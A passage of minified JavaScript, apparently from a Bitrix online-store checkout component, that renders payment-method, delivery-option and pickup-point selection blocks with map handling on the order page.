i=BX.create("div",{props:{className:"bx-compact-inner"},children:t});this.paySystemBlockNode.querySelector(".bx-compact-wrapper").appendChild(i)}},editFadePaySystemBlock:function(){this.paySystemBlockNode.querySelector(".bx-soa-section-content");this.initialized.paySystem?this.opened["bx-soa-paysystem"]=!1:(this.editActivePaySystemBlock(!1),BX.remove(BX.lastChild(this.paySystemBlockNode)))},editPaySystemItems:function(e){if(this.result.PAY_SYSTEM&&!(this.result.PAY_SYSTEM.length<=0)){var t,s,i=BX.create("DIV",{props:{className:"col-sm-12 bx-soa-pp-item-container"}}),o=BX.create("DIV",{props:{className:"col-sm-12 bx-soa-pp-company-description"}});for(s=0;s<this.paySystemPagination.currentPage.length;s++)t=this.createPaySystemItem(this.paySystemPagination.currentPage[s]),i.appendChild(t),"Y"==this.paySystemPagination.currentPage[s].CHECKED&&(o.innerHTML=this.paySystemPagination.currentPage[s].DESCRIPTION);this.paySystemPagination.show&&this.showPagination("paySystem",i),e.appendChild(i)}},getImageNode:function(e,t){let s,i,o="DELIVERY"===t;return i=BX.create("DIV",{props:{className:"bx-soa-pp-company-image"}}),s=this.getImageSources(e,o?"LOGOTIP":"PSA_LOGOTIP"),s&&s.src_2x?i.setAttribute("style","background-image: url("+s.src_1x+");background-image: -webkit-image-set(url("+s.src_1x+") 1x, url("+s.src_2x+") 2x)"):(s=s&&s.src_1x||(o?this.defaultDeliveryLogo:this.defaultPaySystemLogo),i.setAttribute("style","background-image: url("+s+");")),i},createPaySystemItem:function(e){var t,s,i,o,a,r,l="Y"==e.CHECKED,n=parseInt(e.ID);return"Y"==this.params.SHOW_IMAGES&&(t=this.getImageNode(e,"PAY_SYSTEM")),s=[BX.create("INPUT",{props:{id:"ID_PAY_SYSTEM_ID_"+n,name:"PAY_SYSTEM_ID",type:"radio",className:"bx-soa-pp-company-checkbox form-radiobox__input",value:n,checked:l}}),BX.create("LABEL",{props:{for:"ID_PAY_SYSTEM_ID_"+n,className:"bx-soa-pp-company-label properties__title char_name form-radiobox__label ",lang:"ru"},html:"<span>"+("N"!=this.params.SHOW_PAY_SYSTEM_LIST_NAMES?e.NAME:e.OWN_NAME)+"</span><span class='form-radiobox__box'></span>"+(this.uniqueText(e.DESCRIPTION)?"<div class='hint'><span class='hint__icon bordered rounded bg-theme-hover border-theme-hover'><i>?</i></span><div class='tooltip'>"+e.DESCRIPTION+"</div></div>":""),events:{click:BX.proxy(this.selectPaySystem,this)}})],o=BX.create("DIV",{props:{className:"bx-soa-pp-company-graf-container properties form-radiobox"},children:s}),r=BX.create("DIV",{props:{className:"bx-soa-pp-company-inject clearfix hidden"},html:""}),i=BX.create("DIV",{props:{className:"bx-soa-pp-company-inner filter radio bordered rounded3"},children:[o,t,r]}),(a=BX.create("DIV",{props:{className:"bx-soa-pp-company bx-soa-pp-company-item col-lg-4 col-sm-6 col-xs-12"},children:[i]})).setAttribute("data-id",e.ID),l&&BX.addClass(a,"bx-selected"),a},editPaySystemInfo:function(e){if(this.result.PAY_SYSTEM&&(0!=this.result.PAY_SYSTEM.length||"Y"==this.result.PAY_FROM_ACCOUNT)){var t,s,i,o,a=BX.create("DIV",{props:{className:"bx-soa-pp-desc-container"}});BX.cleanNode(a),"Y"==this.result.PAY_FROM_ACCOUNT&&(t=this.getInnerPaySystem(a)),o=this.getSelectedPaySystem(),a.appendChild(BX.create("DIV",{props:{className:"bx-soa-pp-company"},children:[t,i,s]}));var r=BX.findChildren(this.paySystemBlockNode,{className:"bx-soa-pp-company-inject"},!0);if(r&&r.length)for(var l=0;l<r.length;++l)BX.addClass(r[l],"hidden"),BX.cleanNode(r[l]);if(o)if((e=BX.findChildren(this.paySystemBlockNode,{className:"bx-soa-pp-company",attribute:{"data-id":o.ID}},!0))&&e.length){var n=BX.findChildren(e[0],{className:"bx-soa-pp-company-inject"},!0);n&&n.length&&(BX.cleanNode(n[0]),n[0].appendChild(a),BX.removeClass(n[0],"hidden"))}}},getInnerPaySystem:function(){if(this.result.CURRENT_BUDGET_FORMATED&&this.result.PAY_CURRENT_ACCOUNT&&this.result.INNER_PAY_SYSTEM){this.params.ONLY_FULL_PAY_FROM_ACCOUNT&&this.params.ONLY_FULL_PAY_FROM_ACCOUNT;var e,t,s,i,o,a=this.result.PAY_CURRENT_ACCOUNT&&"Y"==this.result.PAY_CURRENT_ACCOUNT,r=this.result.INNER_PAY_SYSTEM;return t=BX.create("LABEL",{props:{className:"bx-soa-pp-company-subTitle form-checkbox__label form-checkbox__label--sm"+(a?" checked":""),htmlFor:"PAY_CURRENT_ACCOUNT"},children:[BX.create("span",{props:{className:"form-checkbox__box form-checkbox__box--static"}}),r.NAME]}),s=BX.create("INPUT",{props:{type:"checkbox",className:"bx-soa-pp-company-checkbox form-checkbox__input",name:"PAY_CURRENT_ACCOUNT",id:"PAY_CURRENT_ACCOUNT",value:"Y",checked:a}}),e=BX.create("DIV",{props:{className:"filter label_block"+(a?" checked":"")},children:[s,t]}),i=BX.message("INNER_PS_BALANCE_DEFAULT")+' <b class="wsnw">'+this.result.CURRENT_BUDGET_FORMATED+"</b>",o=BX.create("DIV",{props:{className:"bx-soa-pp-company-desc"},html:i}),BX.create("DIV",{props:{className:"bx-soa-pp-inner-ps"+(a?" bx-selected":"")},children:[e,o],events:{click:BX.proxy(this.selectPaySystem,this)}})}},editFadePaySystemContent:function(e){var t=this.getSelectedPaySystem(),s=this.paySystemHiddenBlockNode.querySelector("div.alert.alert-danger"),i=this.paySystemHiddenBlockNode.querySelector("div.alert.alert-warning.alert-show");s?e.appendChild(s.cloneNode(!0)):this.getErrorContainer(e),i&&i.innerHTML&&e.appendChild(i.cloneNode(!0)),this.isSelectedInnerPayment()||t&&t.NAME||(addedHtml="<strong>"+BX.message("SOA_PS_SELECT_ERROR")+"</strong>")},getSelectedPaySystem:function(){var e,t,s=this.paySystemBlockNode.querySelector("input[name=PAY_SYSTEM_ID]:checked"),i=null;if(s||(s=this.paySystemHiddenBlockNode.querySelector("input[name=PAY_SYSTEM_ID]:checked")),s||(s=this.paySystemHiddenBlockNode.querySelector("input[type=hidden][name=PAY_SYSTEM_ID]")),s)for(e=s.value,t=0;t<this.result.PAY_SYSTEM.length;t++)if(this.result.PAY_SYSTEM[t].ID==e){i=this.result.PAY_SYSTEM[t];break}return i},isSelectedInnerPayment:function(){var e=this.paySystemBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]");return e||(e=this.paySystemHiddenBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]")),e&&e.checked},selectPaySystem:function(e){if(this.orderBlockNode&&e){var t,s=e.target||e.srcElement,i=this.paySystemBlockNode.querySelector("div.bx-soa-pp-inner-ps"),o=this.paySystemBlockNode.querySelector("input[name=PAY_CURRENT_ACCOUNT]"),a=this.result.TOTAL&&0===parseFloat(this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY),r=BX.hasClass(s,"bx-soa-pp-inner-ps")?s:BX.findParent(s,{className:"bx-soa-pp-inner-ps"}),l=BX.hasClass(s,"bx-soa-pp-company")?s:BX.findParent(s,{className:"bx-soa-pp-company"});if(r)"INPUT"==s.nodeName&&(o.checked=!o.checked),o.checked?(BX.removeClass(i,"bx-selected"),o.checked=!1):(BX.addClass(i,"bx-selected"),o.checked=!0);else if(l){if(BX.hasClass(l,"bx-selected"))return BX.PreventDefault(e);o&&o.checked&&a?(BX.addClass(l,"bx-selected"),l.querySelector("input.bx-soa-pp-company-checkbox").checked=!0,BX.removeClass(i,"bx-selected"),o.checked=!1):(t=this.paySystemBlockNode.querySelector(".bx-soa-pp-company.bx-selected"),BX.addClass(l,"bx-selected"),l.querySelector("input.bx-soa-pp-company-checkbox").checked=!0,t&&(BX.removeClass(t,"bx-selected"),t.querySelector("input.bx-soa-pp-company-checkbox").checked=!1))}this.sendRequest()}},editDeliveryBlock:function(e){this.deliveryBlockNode&&this.deliveryHiddenBlockNode&&this.result.DELIVERY&&(this.editActiveDeliveryBlock(e),this.checkPickUpShow(),this.initialized.delivery=!0)},editActiveDeliveryBlock:function(e){var t,s,i=this.deliveryBlockNode;this.result.IS_AUTHORIZED&&!this.opened[this.deliveryBlockNode.id]&&(this.opened[this.deliveryBlockNode.id]=!0,BX.removeClass(this.deliveryBlockNode,"bx-selected")),this.initialized.delivery||(this.opened[this.deliveryBlockNode.id]||this.deliveryBlockNode.classList.add("bx-step-completed"),(t=i.querySelector(".bx-soa-section-content"))?BX.cleanNode(t):(t=this.getNewContainer(),i.appendChild(t)),BX.cleanNode(i.querySelector(".bx-soa-section-location")),this.getDeliveryLocationInput(i.querySelector(".bx-soa-section-location")),this.getErrorContainer(t),s=BX.create("DIV",{props:{className:"bx-soa-pp row"}}),this.editDeliveryItems(s),t.appendChild(s),this.editDeliveryInfo(s),this.showPropInDelivery("ADDRESS",s,BX.message("SOA_ADDRESS")),this.showPickUp(s),this.getZipLocationInput(s),"Y"!==this.params.HIDE_ORDER_DESCRIPTION&&this.editPropsComment(s),this.getBlockFooter(t)),e&&this.initialized.delivery||this.getDeliveryCompactInfo()},getDeliveryCompactInfo:function(){BX.remove(BX.lastChild(this.deliveryBlockNode.querySelector(".bx-compact-wrapper")));let e=this.getSelectedDelivery();const t=[],s=BX.create("div",{props:{className:"bx-compact-title"},html:e.NAME??BX.message("BX_SOA_NO_DELIVERY")});if(t.push(s),e){if("Y"==this.params.SHOW_IMAGES){const s=this.getImageNode(e,"DELIVERY");t.push(s);const i=BX.create("DIV",{props:{className:"bordered-bottom bx-soa-grey-separate-node bx-soa-grey-separate-node--mb"}});t.push(i)}const s=this.deliveryBlockNode.querySelector("#zipProperty");if(s){const e=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_INDEX"),s.value)});t.push(e)}const i=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_CITY"),'<span class="destination_value">'+this.deliveryBlockNode.querySelector(".destination_value").textContent+"</span>")});t.push(i);const o=this.deliveryBlockNode.querySelector(".ADDRESS textarea");if(o&&o.value){const e=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_ADDRESS"),o.value)});t.push(e)}const a=this.deliveryBlockNode.querySelector("#orderDescription");if(a&&a.value){const e=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_COMMENT"),a.value)});t.push(e)}if(e.PRICE_FORMATED){const s=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("TITLE_SOA_DELIVERY_COST"),e.PRICE>0?void 0!==e.DELIVERY_DISCOUNT_PRICE?e.DELIVERY_DISCOUNT_PRICE>0?e.DELIVERY_DISCOUNT_PRICE_FORMATED:BX.message("PRICE_FREE_DEFAULT"):e.PRICE_FORMATED:BX.message("PRICE_FREE_DEFAULT"))});t.push(s)}if(e.PERIOD_TEXT){const s=BX.create("div",{props:{className:"bx-compact-prop"},html:this.getDerivedBlock(BX.message("SALE_SADC_TRANSIT"),e.PERIOD_TEXT)});t.push(s)}}if(t.length){const e=BX.create("div",{props:{className:"bx-compact-inner"},children:t});this.deliveryBlockNode.querySelector(".bx-compact-wrapper").appendChild(e)}},getDerivedBlock:function(e,t){return'<div class="bx-compact__prop-title">'+e+'</div><div class="bx-compact__prop-value">'+t+"</div>"},showPropInDelivery:function(e,t,s){if(!this.result.ORDER_PROP||!this.propertyCollection)return;var i,o,a,r,l=this.propertyCollection.getGroupIterator();s&&(r=BX.create("DIV",{props:{className:"bx-soa-title-subblock"},text:s}));const n=BX.create("DIV",{props:{className:"bx-soa-pp-company-item "+e},children:[r]}),c=BX.create("DIV",{props:{className:"col-md-12 bx-soa-extraprops group-without-margin"},children:[n]});let p=!1;for(;i=l();)for(a=i.getIterator();o=a();)o.getSettings().CODE===e&&(this.getPropertyRowNode(o,n,!1,!1),p=!0);p&&t.appendChild(c)},showPickUp:function(e){const t=BX.create("div",{props:{id:"bx-soa-pickup",className:"col-md-12"},children:[BX.create("div",{props:{className:"bx-soa-section-content bx-soa-pp-company-item"}})]});e.appendChild(t),this.pickUpBlockNode=BX("bx-soa-pickup")},editDeliveryItems:function(e){if(this.result.DELIVERY&&!(this.result.DELIVERY.length<=0)){var t,s,i=BX.create("DIV",{props:{className:"col-sm-12 bx-soa-pp-item-container"}});for(s=0;s<this.deliveryPagination.currentPage.length;s++)t=this.createDeliveryItem(this.deliveryPagination.currentPage[s]),i.appendChild(t);this.deliveryPagination.show&&this.showPagination("delivery",i),e.appendChild(i)}},editDeliveryInfo:function(e){if(this.result.DELIVERY){var t,s,i,o,a,r=BX.create("DIV",{props:{className:" bx-soa-pp-desc-container"}});BX.cleanNode(r),t=this.getSelectedDelivery(),s=BX.create("DIV",{props:{className:"bx-soa-pp-company-block"},children:[BX.create("DIV",{props:{className:"bx-soa-pp-company-desc"},html:""})]}),i=BX.create("DIV",{style:{clear:"both"}}),(o=this.getDeliveryExtraServices(t)).length&&(a=BX.create("DIV",{props:{className:"bx-soa-pp-company-item col-md-6"},children:o}),e.appendChild(BX.create("DIV",{props:{className:"col-md-12 bx-soa-extraservices"},children:[a]})),a=BX.create("DIV",{props:{className:"bx-soa-pp-company-block bx-soa-pp-company-block__extra-services"},children:o})),r.appendChild(BX.create("DIV",{props:{className:"bx-soa-pp-company"},children:[s,i,a]}));var l=BX.findChildren(this.deliveryBlockNode,{className:"bx-soa-pp-company-inject"},!0);if(l&&l.length)for(var n=0;n<l.length;++n)BX.addClass(l[n],"hidden"),BX.cleanNode(l[n]);if((e=BX.findChildren(this.deliveryBlockNode,{className:"bx-soa-pp-company",attribute:{"data-id":t.ID}},!0))&&e.length){var c=BX.findChildren(e[0],{className:"bx-soa-pp-company-inject"},!0);c&&c.length&&(BX.cleanNode(c[0]),c[0].appendChild(r),BX.removeClass(c[0],"hidden"))}"Y"!=this.params.DELIVERY_NO_AJAX&&(this.deliveryCachedInfo[t.ID]=t)}},getDeliveryPriceNodes:function(e){return void 0!==e.DELIVERY_DISCOUNT_PRICE&&parseFloat(e.DELIVERY_DISCOUNT_PRICE)!=parseFloat(e.PRICE)?parseFloat(e.DELIVERY_DISCOUNT_PRICE)>parseFloat(e.PRICE)?[e.DELIVERY_DISCOUNT_PRICE_FORMATED]:[e.DELIVERY_DISCOUNT_PRICE_FORMATED,BX.create("BR"),BX.create("SPAN",{props:{className:"bx-price-old"},html:e.PRICE_FORMATED})]:[e.PRICE_FORMATED]},getDeliveryExtraServices:function(e){const t=this.deliveryBlockNode.querySelector(".bx-soa-delivery-warning");if(!e){if(!t){const e=this.deliveryBlockNode.querySelector(".bx-soa-section-content");e.querySelector(".bx-soa-pp").style.display="none",e.removeAttribute("style"),e.appendChild(BX.create("div",{props:{className:"bx-soa-delivery-warning"},children:[BX.create("div",{props:{className:"alert alert-warning"},text:BX.message("SOA_DELIVERY_LOCATION_INVALID")})]}))}return[]}t&&t.remove();var s,i,o,a,r,l=[];for(s in e.EXTRA_SERVICES.length&&l.push(BX.create("div",{props:{className:"bx-soa-title-subblock"},html:BX.util.htmlspecialchars(BX.message("SOA_TITLE_SERVICE"))})),e.EXTRA_SERVICES)if(e.EXTRA_SERVICES.hasOwnProperty(s)&&(i=e.EXTRA_SERVICES[s]).canUserEditValue){if(-1==i.editControl.indexOf("this.checked"))a=BX.create("LABEL",{html:BX.util.htmlspecialchars(i.name)+(i.price?" ("+i.priceFormatted+")":"")}),0==s&&!0,o=BX.create("DIV",{props:{className:"form-group bx-soa-pp-field"},html:i.editControl+(i.description&&i.description.length?'<div class="bx-soa-service-small">'+BX.util.htmlspecialchars(i.description)+"</div>":"")}),BX.prepend(a,o),(r=o.querySelector("input[type=text]"))||(r=o.querySelector("select")),r&&BX.addClass(r,"form-control");else{let e=i.editControl.match(/name="(.+?)"/);o=BX.create("DIV",{props:{className:"form-group filter label_block"},children:[i.editControl.replace("onchange",'id="'+e[1]+'" class="form-checkbox__input" onchange'),BX.create("LABEL",{props:{htmlFor:e[1],className:"form-checkbox__label"},html:BX.util.htmlspecialchars(i.name)+(i.price?" ("+i.priceFormatted+")":"")+'<span class="form-checkbox__box form-box"></span>'}),i.description&&i.description.length?'<div class="bx-soa-service-small">'+BX.util.htmlspecialchars(i.description)+"</div>":""]})}l.push(o)}return l},editFadeDeliveryBlock:function(){this.deliveryBlockNode.querySelector(".bx-soa-section-content");this.initialized.delivery?this.opened["bx-soa-delivery"]=!1:(this.editActiveDeliveryBlock(!1),BX.remove(BX.lastChild(this.deliveryBlockNode)))},createDeliveryItem:function(e){var t,s,i,o,a,r,l,n,c,p,h="Y"==e.CHECKED,d=parseInt(e.ID),u=[BX.create("INPUT",{props:{id:"ID_DELIVERY_ID_"+d,name:"DELIVERY_ID",type:"radio",className:"bx-soa-pp-company-checkbox form-radiobox__input",value:d,checked:h}}),BX.create("LABEL",{props:{for:"ID_DELIVERY_ID_"+d,className:"bx-soa-pp-company-label properties__title char_name form-radiobox__label",lang:"ru"},html:"<span>"+("N"!=this.params.SHOW_DELIVERY_PARENT_NAMES?e.NAME:e.OWN_NAME)+"</span><span class='form-radiobox__box'></span>"+(this.uniqueText(e.DESCRIPTION)&&!h?"<div class='hint '><span class='hint__icon bordered rounded bg-theme-hover border-theme-hover'><i>?</i></span><div class='tooltip'>"+e.DESCRIPTION+"</div></div>":""),events:{click:BX.proxy(this.selectDelivery,this)}})],m=this.deliveryCachedInfo[d];"Y"==this.params.SHOW_IMAGES&&(t=this.getImageNode(e,"DELIVERY"));var B=!1;e.PRICE>=0||void 0!==e.DELIVERY_DISCOUNT_PRICE?(B=!0,a=BX.create("DIV",{props:{className:"bx-soa-pp-delivery-cost"},html:'<div class="bx-soa-pp-list-termin" lang="ru">'+this.params.MESS_PRICE+':</div><div class="bx-soa-pp-list-description" lang="ru">'+(e.PRICE>0?void 0!==e.DELIVERY_DISCOUNT_PRICE?e.DELIVERY_DISCOUNT_PRICE_FORMATED:e.PRICE_FORMATED:this.params.MESS_PRICE_FREE)+"</div>"})):m&&(m.PRICE>=0||void 0!==m.DELIVERY_DISCOUNT_PRICE)&&(B=!0,a=BX.create("DIV",{props:{className:"bx-soa-pp-delivery-cost"},html:'<div class="bx-soa-pp-list-termin" lang="ru">'+this.params.MESS_PRICE+':</div><div class="bx-soa-pp-list-description" lang="ru">'+(m.PRICE>0?void 0!==m.DELIVERY_DISCOUNT_PRICE?m.DELIVERY_DISCOUNT_PRICE_FORMATED:m.PRICE_FORMATED:this.params.MESS_PRICE_FREE)+"</div>"})),s=BX.create("DIV",{props:{className:"bx-soa-pp-company-graf-container properties form-radiobox "+(e.CALCULATE_ERRORS||m&&m.CALCULATE_ERRORS?" bx-bd-waring":"")},children:u}),r=BX.create("DIV",{props:{className:"bx-soa-pp-company-description "+(h?"":"hidden")},html:e.DESCRIPTION}),c=BX.create("DIV",{props:{className:"bx-soa-pp-company-inject clearfix hidden"},html:""});var E="PERIOD_TEXT"in e&&e.PERIOD_TEXT.length;E&&(l=BX.create("DIV",{props:{className:"bx-soa-pp-delivery-period"},html:'<div class="bx-soa-pp-list-termin" lang="ru">'+this.params.MESS_PERIOD+':</div><div class="bx-soa-pp-list-description" lang="ru">'+e.PERIOD_TEXT+"</div>"})).setAttribute("lang","ru");var S="CALCULATE_DESCRIPTION"in e&&e.CALCULATE_DESCRIPTION.length;S&&(n=BX.create("DIV",{props:{className:"bx-soa-pp-delivery-calculate"},html:'<div class="bx-soa-pp-list-termin" lang="ru">'+this.params.MESS_PRICE+':</div><div class="bx-soa-pp-list-description" lang="ru">'+e.CALCULATE_DESCRIPTION+"</div>"})).setAttribute("lang","ru"),t&&h&&(e.DESCRIPTION||E||E||S)&&(p=BX.create("DIV",{props:{className:"bordered-bottom bx-soa-grey-separate-node"}}));let g=[s,undefined,a,t,p,l,n,c,r];return i=BX.create("DIV",{props:{className:"bx-soa-pp-company-inner filter radio bordered rounded3"},children:g}),(o=BX.create("DIV",{props:{className:"bx-soa-pp-company bx-soa-pp-company-item"+(B?" bx-soa-pp-company--hasprice":"")+(E?" bx-soa-pp-company--hasperiod":"")+(S?" bx-soa-pp-company--hascalculate":"")+" col-sm-6 col-xs-12"},children:[i]})).setAttribute("data-id",e.ID),h&&BX.addClass(o,"bx-selected"),h&&this.result.LAST_ORDER_DATA.PICK_UP&&(this.lastSelectedDelivery=d),o},editFadeDeliveryContent:function(e){var t=this.getSelectedDelivery(),s=("N"!=this.params.SHOW_DELIVERY_PARENT_NAMES?t.NAME:t.OWN_NAME,this.deliveryHiddenBlockNode.querySelector("div.alert.alert-danger")),i=this.deliveryHiddenBlockNode.querySelector("div.alert.alert-warning.alert-show");s&&s.innerHTML?e.appendChild(s.cloneNode(!0)):this.getErrorContainer(e),i&&i.innerHTML&&e.appendChild(i.cloneNode(!0)),t&&t.NAME||e.appendChild(BX.create("STRONG",{text:BX.message("SOA_DELIVERY_SELECT_ERROR")}))},selectDelivery:function(e){if(this.orderBlockNode){var t,s,i=e.target||e.srcElement,o=BX.findParent(i,{className:"bx-soa-pp-company-inject"}),a=BX.hasClass(i,"bx-soa-pp-company-item")?i:BX.findParent(i,{className:"bx-soa-pp-company-item"}),r=this.deliveryBlockNode.querySelector(".bx-soa-pp-company-item.bx-selected");if(!o){if(BX.hasClass(a,"bx-selected"))return"INPUT"==i.nodeName||"A"==i.nodeName||"LABEL"==i.nodeName?void 0:BX.PreventDefault(e);a&&(t=a.querySelector("input[type=radio]"),BX.addClass(a,"bx-selected"),t.checked=!0),r&&(s=r.querySelector("input[type=radio]"),BX.removeClass(r,"bx-selected"),s.checked=!1),this.isDeliveryChanged=!0,this.sendRequest()}}},getSelectedDelivery:function(){var e,t,s=this.deliveryBlockNode.querySelector("input[type=radio][name=DELIVERY_ID]:checked"),i=!1;if(s||(s=this.deliveryHiddenBlockNode.querySelector("input[type=radio][name=DELIVERY_ID]:checked")),s||(s=this.deliveryHiddenBlockNode.querySelector("input[type=hidden][name=DELIVERY_ID]")),s)for(t in e=s.value,this.result.DELIVERY)if(this.result.DELIVERY[t].ID==e){i=this.result.DELIVERY[t];break}return i},activatePickUp:function(e){this.pickUpBlockNode&&this.pickUpHiddenBlockNode&&(this.pickUpBlockNode.style.display="",BX.hasClass(this.pickUpBlockNode,"bx-active")||(BX.addClass(this.pickUpBlockNode,"bx-active"),this.pickUpBlockNode.style.display=""))},deactivatePickUp:function(){this.pickUpBlockNode&&this.pickUpHiddenBlockNode&&BX.hasClass(this.pickUpBlockNode,"bx-active")&&(BX.removeClass(this.pickUpBlockNode,"bx-active"),this.pickUpBlockNode.style.display="none")},editPickUpBlock:function(e){this.pickUpBlockNode&&this.pickUpHiddenBlockNode&&BX.hasClass(this.pickUpBlockNode,"bx-active")&&this.result.DELIVERY&&(this.initialized.pickup=!1,e?this.editActivePickUpBlock(!0):this.editFadePickUpBlock(),this.initialized.pickup=!0)},editActivePickUpBlock:function(e){var t,s,i=e?this.pickUpBlockNode:this.pickUpHiddenBlockNode;if(this.initialized.pickup)"Y"===this.params.SHOW_NEAREST_PICKUP&&this.maps&&!this.maps.maxWaitTimeExpired&&(this.maps.maxWaitTimeExpired=!0,this.initPickUpPagination(),this.editPickUpList(!0),this.pickUpFinalAction()),this.maps&&!this.pickUpMapFocused&&(this.pickUpMapFocused=!0,setTimeout(BX.proxy(this.maps.pickUpMapFocusWaiter,this.maps),200));else{(t=i.querySelector(".bx-soa-section-content"))||(t=this.getNewContainer(),i.appendChild(t)),BX.cleanNode(t);let e="Y"===this.params.SHOW_PICKUP_MAP?"":"pickup-wrapper--no-map";var o=BX.create("DIV",{props:{className:"bx-soa-pickup-list-outer-wrap scrollbar"}});s=BX.create("DIV",{props:{className:"col-xs-12 pickup-wrapper "+e},children:[o]}),this.editPickUpMap(s),this.editPickUpLoader(s),t.appendChild(BX.create("DIV",{props:{className:"bx_soa_pickup row"},children:[s]})),"Y"==this.params.SHOW_PICKUP_MAP&&"Y"==this.params.SHOW_NEAREST_PICKUP||(this.initPickUpPagination(),this.editPickUpList(!0),this.pickUpFinalAction())}},editFadePickUpBlock:function(){var e;this.pickUpBlockNode.querySelector(".bx-soa-section-content");this.initialized.pickup||(this.editActivePickUpBlock(!1),BX.remove(BX.lastChild(this.pickUpBlockNode))),e=this.getNewContainer(),this.pickUpBlockNode.appendChild(e),this.editFadePickUpContent(e)},editFadePickUpContent:function(e){var t=this.getSelectedPickUp();t&&("Y"==this.params.SHOW_STORES_IMAGES&&'<img src="'+(this.getImageSources(t,"IMAGE_ID").src_1x||this.defaultStoreLogo)+'" class="bx-soa-pickup-preview-img">',"<strong>"+BX.util.htmlspecialchars(t.TITLE)+"</strong>",t.ADDRESS&&"<br><strong>"+BX.message("SOA_PICKUP_ADDRESS")+":</strong> "+BX.util.htmlspecialchars(t.ADDRESS),t.PHONE&&"<br><strong>"+BX.message("SOA_PICKUP_PHONE")+":</strong> "+BX.util.htmlspecialchars(t.PHONE),t.SCHEDULE&&"<br><strong>"+BX.message("SOA_PICKUP_WORK")+":</strong> "+BX.util.htmlspecialchars(t.SCHEDULE),t.DESCRIPTION&&(BX.message("SOA_PICKUP_DESC"),BX.util.htmlspecialchars(t.DESCRIPTION)))},getPickUpInfoArray:function(e){if(!e||e.length<=0)return[];var t,s=[];for(t=0;t<e.length;t++)this.result.STORE_LIST[e[t]]&&s.push(this.result.STORE_LIST[e[t]]);return s},getSelectedPickUp:function(){var e,t,s,i=BX("BUYER_STORE"),o=this.result.STORE_LIST;if(i&&!(e=o[i.value])&&(t=this.getSelectedDelivery().STORE))for(s in t)if(t.hasOwnProperty(s)){e=o[t[s]],i.setAttribute("value",t[s]);break}return e},checkPickUpShow:function(){var e,t,s=this.getSelectedDelivery();s&&s.STORE&&s.STORE.length&&(t=this.getPickUpInfoArray(s.STORE)),t&&t.length?(e="N"!=this.params.SHOW_DELIVERY_PARENT_NAMES?s.NAME:s.OWN_NAME,s.STORE_MAIN=s.STORE,this.activatePickUp(e),this.editSection(this.pickUpBlockNode)):this.deactivatePickUp()},geoLocationSuccessCallback:function(e){var t,s=this.getSelectedDelivery();s&&s.STORE&&(t=this.getPickUpInfoArray(s.STORE)),t&&t.length>=this.options.pickUpMap.minToShowNearestBlock&&e&&this.editPickUpRecommendList(e.geoObjects.get(0)),this.initPickUpPagination(),this.editPickUpList(!0),this.pickUpFinalAction()},geoLocationFailCallback:function(){this.initPickUpPagination(),this.editPickUpList(!0),this.pickUpFinalAction()},initMaps:function(){if(this.maps=BX.Sale.OrderAjaxComponent.Maps.init(this),this.maps){if(this.mapsReady=!0,this.resizeMapContainers(),"Y"===this.params.SHOW_PICKUP_MAP&&BX("pickUpMap")){var e=this.getSelectedDelivery();if(e&&e.STORE&&e.STORE.length)var t=this.getPickUpInfoArray(e.STORE);if(t&&t.length){var s=this.getSelectedPickUp();this.maps.initializePickUpMap(s),this.maps&&!this.pickUpMapFocused&&(this.pickUpMapFocused=!0,setTimeout(BX.proxy(this.maps.pickUpMapFocusWaiter,this.maps),200)),"Y"===this.params.SHOW_NEAREST_PICKUP&&this.maps.showNearestPickups(BX.proxy(this.geoLocationSuccessCallback,this),BX.proxy(this.geoLocationFailCallback,this)),this.maps.buildBalloons(t),setTimeout(BX.proxy((function(){BX("pickUpMap").appendChild(BX.create("DIV",{props:{className:"yandex-map__mobile-opener"},events:{click:BX.proxy((function(e){const t=BX("pickUpMap");function s(e){return(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement)==e}s(t)?document.exitFullscreen():(this.maps.pickUpMap.container&&this.maps.pickUpMap.container.enterFullscreen(),this.maps.pickUpMap.getDiv&&this.maps.pickUpMap.getDiv().requestFullscreen()),document.onwebkitfullscreenchange=document.onmsfullscreenchange=document.onmozfullscreenchange=document.onfullscreenchange=function(){s(t)?t.classList.add("is-fullscreen"):t.classList.remove("is-fullscreen")},e.stopImmediatePropagation()}),this)}}))}),this),200)}}if("Y"===this.params.SHOW_MAP_IN_PROPS&&BX("propsMap")){var i=this.getPropertyMapData();this.maps.initializePropsMap(i)}}},getPropertyMapData:function(){var e,t,s,i=this.options.propertyMap.defaultMapPosition;for(s in this.result.ORDER_PROP.properties)if(this.result.ORDER_PROP.properties.hasOwnProperty(s)&&"Y"==(e=this.result.ORDER_PROP.properties[s]).IS_LOCATION){t=e.ID;break}if(this.locations[t]&&this.locations[t][0]&&this.locations[t][0].coordinates){e=this.locations[t][0].coordinates;var o=parseFloat(e.LONGITUDE),a=parseFloat(e.LATITUDE);isNaN(o)||isNaN(a)||0==o||0==a||(i.lon=o,i.lat=a)}return i},resizeMapContainers:function(){var e,t,s=BX("pickUpMap"),i=BX("propsMap"),o=this.propsBlockNode;o&&(s||i)&&(e=o.clientWidth,t=parseInt(e/16*9),"Y"===this.params.SHOW_PICKUP_MAP&&s&&(s.style.height=t+"px"),"Y"===this.params.SHOW_MAP_IN_PROPS&&i&&(i.style.height=t+"px"))},editPickUpMap:function(e){e.appendChild(BX.create("DIV",{props:{id:"pickUpMap",className:"bx-yandex-view-layout"},style:{width:"100%"}}))},editPickUpLoader:function(e){e.appendChild(BX.create("DIV",{props:{id:"pickUpLoader",className:"text-center"},children:[BX.create("IMG",{props:{src:this.templateFolder+"/images/loader.gif"}})]}))},editPickUpList:function(e){if(this.pickUpPagination.currentPage&&this.pickUpPagination.currentPage.length){BX.remove(BX("pickUpLoader"));var t,s,i,o,a,r,l,n=BX.create("DIV",{props:{className:"bx-soa-pickup-list 